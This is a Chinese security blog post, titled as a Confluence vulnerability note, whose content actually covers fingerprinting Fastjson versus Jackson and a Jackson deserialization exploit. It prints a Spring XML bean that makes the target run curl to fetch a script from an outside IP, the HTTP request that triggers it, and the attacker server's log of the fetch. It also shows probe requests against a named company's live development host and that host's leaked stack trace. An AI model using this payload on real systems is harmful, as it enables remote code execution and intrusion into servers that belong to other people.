---
title:      "「vulnhub」:Confluence漏洞复现总结"
author:     "Bin4xin"
catalog: true

article_header:
  type: cover
tags:
    - 笔记
    - 漏洞复现
    - vulnhub
    - CVE

---


# 区分 Fastjson 和 Jackson
post数据包：
{"name":"S", "age":21}
1
{"name":"S", "age":21,"agsbdkjada__ss_d":123}
1
这两个fastjson都不会报错，而jackson会报错，因为Jackson 因为强制key与javabean属性对齐,只能少不能多key,所以会报错。

```bash
cat jackson1.xml 

<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans
     http://www.springframework.org/schema/beans/spring-beans.xsd
">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg>
            <array>
                <value>curl</value>
		<value>http://47.52.233.92:8000/pc.py</value>
            </array>
        </constructor-arg>
        <property name="any" value="#{ pb.start() }"/>
    </bean>
</beans>
----------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------
POST /exploit HTTP/1.1
Host: 192.168.43.14:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/json
Upgrade-Insecure-Requests: 1
Content-Length: 142

{
  "param": [
   "org.springframework.context.support.FileSystemXmlApplicationContext",
   "http://47.52.233.92:8000/jackson1.xml"
  ]
}
```
```bash
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
223.246.173.228 - - [31/Aug/2020 16:05:12] "GET /jackson1.xml HTTP/1.1" 200 -
223.246.173.228 - - [31/Aug/2020 16:05:12] "GET /jackson1.xml HTTP/1.1" 200 -
223.246.173.228 - - [31/Aug/2020 16:05:12] code 404, message File not found
223.246.173.228 - - [31/Aug/2020 16:05:12] "GET /pc.py HTTP/1.1" 404 -
```
## 探测jackson

```bash
POST /jubaopen/api2/wealth/mail/getCheckCode HTTP/1.1
Host: dev.pactera.com
Content-Length: 24
DNT: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Edg/84.0.522.58
Content-Type: application/json;charset=UTF-8
Accept: application/json, text/plain, */*
timeStamp: 1597418145214
userId: undefined
token: undefined
deviceType: 2
Origin: http://dev.pactera.com
Referer: http://dev.pactera.com/jubaopen/weixin2/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close

{"name":"S", "age":21}
```
```bash
HTTP/1.1 200 
Server: nginx/1.16.1
Date: Fri, 14 Aug 2020 15:21:32 GMT
Content-Type: application/json;charset=UTF-8
Connection: close
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: POST,GET,PUT,OPTIONS,DELETE,PATCH
Access-Control-Max-Age: 3600
Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept
Content-Length: 19469

{"code":null,"msg":null,"data":{"cause":null,"stackTrace":[{"classLoaderName":null,"moduleName":null,"moduleVersion":null,"methodName":"parse","fileName":"InternetAddress.java","lineNumber":696,"nativeMethod":false,"className":"javax.mail.internet.InternetAddress"},{"classLoaderName":null,"moduleName":null,"moduleVersion":null,"methodName":"parse","fileName":"InternetAddress.java","lineNumber":655,"nativeMethod":false,"className":
···
···
···
methodName":"run","fileName":"Thread.java","lineNumber":830,"nativeMethod":false,"className":"java.lang.Thread"}],"message":null,"suppressed":[],"localizedMessage":null}}
```